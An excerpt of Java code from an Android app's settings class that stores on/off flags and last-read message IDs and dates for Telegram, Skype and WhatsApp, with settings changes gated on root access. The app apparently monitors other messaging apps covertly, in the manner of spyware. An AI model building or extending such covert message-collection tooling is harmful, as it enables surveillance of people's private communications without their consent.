...
import com.hyadesinc.curiosus.lib.TelephonyInfo;
...
public class SettingsManager {
	...
	public Boolean isTelegramEnabled(){
		return settings.getBoolean("TELEGRAM_ENABLED", false);
	}

    public Boolean isSkypeEnabled(){
        return settings.getBoolean("SKYPE_ENABLED", false);
    }

    public Long telegramLastDate(){
        return settings.getLong("TELEGRAM_LAST_DATE", 1 * 1000L);
    }

	public String telegramLastId(){
		return settings.getString("TELEGRAM_LAST_ID", "0");
	}

	public Long sykpeLastDate(){
		return settings.getLong("SKYPE_LAST_DATE", 1 * 1000L);
	}

	public String skypeLastId(){
		return settings.getString("SKYPE_LAST_ID", "0");
	}

    public Long whatsappLastDate(){
        return settings.getLong("WHATSAPP_LAST_DATE", 1 * 1000L);
    }
	...
	public void isTelegramEnabled(Boolean enabled){
		editSettings("TELEGRAM_ENABLED", enabled);
	}

    public void isSkypeEnabled(Boolean enabled){
        editSettings("SKYPE_ENABLED", enabled);
    }

    public void telegramLastDate(Long timestamp){
        editSettings("TELEGRAM_LAST_DATE", timestamp);
    }

	public void telegramLastId(String id){
		editSettings("TELEGRAM_LAST_ID", id);
	}


	public void skypeLastDate(Long timestamp){
		editSettings("SKYPE_LAST_DATE", timestamp);
	}

	public void skypeLastId(String id){
		editSettings("SKYPE_LAST_ID", id);
	}


    public void whatsappLastDate(Long timestamp){
        editSettings("WHATSAPP_LAST_DATE", timestamp);
    }
	...
	public JSONObject getJSON(){
		...
		try {
            ...
            obj.put("telegram", isTelegramEnabled());
            obj.put("skype", isSkypeEnabled());
		...
		try {
            ...
            if (RootTools.isRootAvailable() && RootTools.isAccessGiven()) {
                ...
                if (key.equals("telegram")) {
                    isTelegramEnabled(obj.getBoolean(key));
                    return;
                }

                if (key.equals("skype")) {
                    isSkypeEnabled(obj.getBoolean(key));
                    return;
                }
